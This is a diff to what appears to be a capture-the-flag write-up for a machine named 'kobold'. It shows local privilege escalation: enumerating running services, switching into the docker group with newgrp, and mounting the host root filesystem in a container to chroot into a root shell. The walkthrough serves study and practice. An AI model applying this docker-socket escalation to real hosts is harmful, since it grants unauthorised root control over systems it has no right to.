@@ -58,21 +58,39 @@ ben@kobold:~$ id
 id
 uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
 ```
-- Group enumeration
+- Group system process
 ```
-ben@kobold:~$ groups
-docker operator ben
+ben@kobold:~$ systemctl list-units --type=service --state=running
+  UNIT                      LOAD   ACTIVE SUB     DESCRIPTION                  >
+  arcane.service            loaded active running Arcane Service
+  auditd.service            loaded active running Security Auditing Service
+  containerd.service        loaded active running containerd container runtime
+  cron.service              loaded active running Regular background program pr>
+  dbus.service              loaded active running D-Bus System Message Bus
+  docker.service            loaded active running Docker Application Container >
+  ...
 ```
-- Show local docker images
+- Operator group has permission to switch to the docker group
+- Docker daemon run as root and listen on a socket at `/var/run/docker.sock`
+- Who has r/w access to this socket can execute commands to Docker as root, including running containers that mount the host file system
 ```
-ben@kobold:~$ docker images
-REPOSITORY                    TAG       IMAGE ID       CREATED        SIZE
-mysql                         latest    f66b7a288113   2 months ago   922MB
-privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731   5 months ago   122MB
+ben@kobold:~$ ls -l /var/run/docker.sock
+srw-rw---- 1 root docker 0 Apr 10 02:09 /var/run/docker.sock
 ```
-- Activate group
+- Show running containers
+```
+ben@kobold:~$ docker ps
+permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/containers/json": dial unix /var/run/docker.sock: connect: permission denied
+```
+- Add ourselves to the docker group
 ```
 ben@kobold:~$ newgrp docker
+```
+- Show running containers
+```
+ben@kobold:~$ docker ps
+CONTAINER ID   IMAGE                               COMMAND                  CREATED       STATUS          PORTS                      NAMES
+4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   "/etc/init.d/rc.local"   7 weeks ago   Up 26 minutes   127.0.0.1:8080->8080/tcp   bin
 ```
 - Exploiting root
 ```
@@ -89,5 +107,5 @@ docker run -it -v /:/mnt --rm -u root --entrypoint /bin/sh privatebin/nginx-fpm-
   - `privatebin/nginx-fpm-alpine:2.0.2`: target image
 - Take control the host
 ```
-/var/www # chroot /mnt /bin/bash
+chroot /mnt /bin/bash
 ```
